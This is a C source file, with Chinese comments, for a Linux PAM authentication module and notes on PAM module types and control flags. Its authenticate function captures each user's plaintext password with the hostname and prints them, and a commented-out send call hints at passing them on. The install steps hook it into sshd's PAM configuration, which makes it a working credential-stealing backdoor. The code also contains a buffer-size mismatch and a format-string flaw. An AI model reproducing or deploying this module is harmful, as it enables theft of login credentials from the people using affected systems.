#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>


//修改用户的秘密信息
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
  return PAM_SUCCESS;
}


//检查受鉴别的用户所持帐户是否有权登陆系统，以及该帐户是否已过期等
PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return PAM_SUCCESS;
}


//鉴别用户
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
  int retval;
  const char* username;
  const char* password;
  char message[1024];
  char hostname[128];
  retval = pam_get_user(pamh, &username, "Username: ");
  pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
  if (retval != PAM_SUCCESS) {
    return retval;
  }
  //pam_get_item(pamh, PAM_RHOST, (const void **)&hostname);
  gethostname(hostname, sizeof hostname);
  snprintf(message,2048,"Hostname: %s\nUsername %s\nPassword: %s\n",hostname,username,password);
  //sendMessage(&message);
  printf(message);
  return PAM_SUCCESS;
}



/*
#not work?
yum intall pam-devel


cc  -fPIC -m64 -shared -lpam            -o pam_demo.so pam_demo.c

gcc -Werror -Wall -fPIC -shared -Xlinker -x -o pam_demo.so pam_demo.c 

cp pam_demo.so /lib64/security/
cp pam_demo.so /lib/security/


vim /etc/pam.d/sshd

#add
auth optional pam_demo.so


*/



/*
#其他语言实现
def pam_sm_authenticate(pamh, flags, argv)   #至少实现这个函数

#设置/etc/pam.d/sshd
auth requisite pam_python.so pam_demo.py

*/



/*

#PAM的模块类型
auth        表示鉴别类接口模块类型用于检查用户和密码，并分配权限；
account     表示账户类接口，主要负责账户合法性检查，确认帐号是否过期，是否有权限登录系统等；
session     会话类接口。实现从用户登录成功到退出的会话控制；
password    口令类接口。控制用户更改密码的全过程。也就是有些资料所说的升级用户验证标记。
            
#PAM的控制标记            
required    表示该行以及所涉及模块的成功是用户通过鉴别的必要条件。换句话说，只有当对应于应用程序的所有带 required标记的模块全部成功后，该程序才能通过鉴别。同时，如果任何带required标记的模块出现了错误，PAM并不立刻将错误消息返回给应用程序，而是在所有模块都调用完毕后才将错误消息返回调用他的程序。 反正说白了，就是必须将所有的模块都执行一次，其中任何一个模块验证出错，验证都会继续进行，并在执行完成之后才返回错误信息。这样做的目的就是不让用户知道自己被哪个模块拒绝，通过一种隐蔽的方式来保护系统服务。就像设置防火墙规则的时候将拒绝类的规则都设置为drop一样，以致于用户在访问网络不成功的时候无法准确判断到底是被拒绝还是目标网络不可达。
requisite   与required相仿，只有带此标记的模块返回成功后，用户才能通过鉴别。不同之处在于其一旦失败就不再执行堆中后面的其他模块，并且鉴别过程到此结束，同时也会立即返回错误信息。与上面的required相比，似乎要显得更光明正大一些。
sufficient  表示该行以及所涉及模块验证成功是用户通过鉴别的充分条件。也就是说只要标记为sufficient的模块一旦验证成功，那么PAM便立即向应用程序返回成功结果而不必尝试任何其他模块。即便后面的层叠模块使用了requisite或者required控制标志也是一样。当标记为sufficient的模块失败时，sufficient模块会当做 optional对待。因此拥有sufficient 标志位的配置项在执行验证出错的时候并不会导致整个验证失败，但执行验证成功之时则大门敞开。所以该控制位的使用务必慎重。
optional    表示即便该行所涉及的模块验证失败用户仍能通过认证。在PAM体系中，带有该标记的模块失败后将继续处理下一模块。也就是说即使本行指定的模块验证失败，也允许用户享受应用程序提供的服务。使用该标志，PAM框架会忽略这个模块产生的验证错误，继续顺序执行下一个层叠模块。
include     表示在验证过程中调用其他的PAM配置文件。在RHEL系统中有相当多的应用通过完整调用/etc/pam.d/system-auth来实现认证而不需要重新逐一去写配置项。这也就意味着在很多时候只要用户能够登录系统，针对绝大多数的应用程序也能同时通过认证。

#模块路径
要调用模块的位置。一般保存在/lib64/security 以及 /lib/security

#模块参数
传递给模块的参数。多个参数之间用空格分隔开

*/
